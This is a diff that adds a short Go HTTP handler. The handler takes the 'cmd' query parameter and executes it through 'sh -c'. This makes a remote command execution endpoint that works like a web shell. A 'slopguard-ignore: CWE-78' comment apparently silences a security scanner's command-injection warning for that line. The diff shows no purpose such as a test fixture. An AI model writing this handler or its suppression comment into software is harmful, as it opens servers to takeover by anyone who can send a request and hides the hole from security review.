@@ -1,0 +1,12 @@
+package main
+
+import (
+	"net/http"
+	"os/exec"
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	cmd := r.URL.Query().Get("cmd")
+	// slopguard-ignore: CWE-78
+	exec.Command("sh", "-c", cmd).Run()
+}
